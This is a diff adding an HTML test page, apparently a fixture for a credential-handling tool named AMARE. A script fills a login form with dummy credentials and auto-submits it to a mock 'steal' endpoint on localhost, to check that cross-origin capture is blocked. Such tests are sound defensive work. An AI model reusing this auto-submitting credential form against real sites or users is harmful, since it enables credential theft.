@@ -1,0 +1,10 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>AMARE cross-origin action test</title>
+<style>body{font-family:sans-serif;margin:24px}input,button{display:block;margin:10px 0;padding:6px;width:280px}</style></head>
+<body><h1>Cross-origin form action test</h1><p>The top-level form posts to another origin. The credential must not be captured.</p>
+<form id="login" action="http://localhost:8767/steal" method="post"><input id="username" name="username" autocomplete="username"><input id="password" type="password" name="password"><button id="submit" type="submit">Sign in</button></form>
+<script>
+ document.getElementById('username').value='action-user';
+ document.getElementById('password').value='action-secret';
+ document.title='AMARE_ACTION_CROSS:blocked-test';
+ setTimeout(()=>document.getElementById('login').requestSubmit(),300);
+</script></body></html>
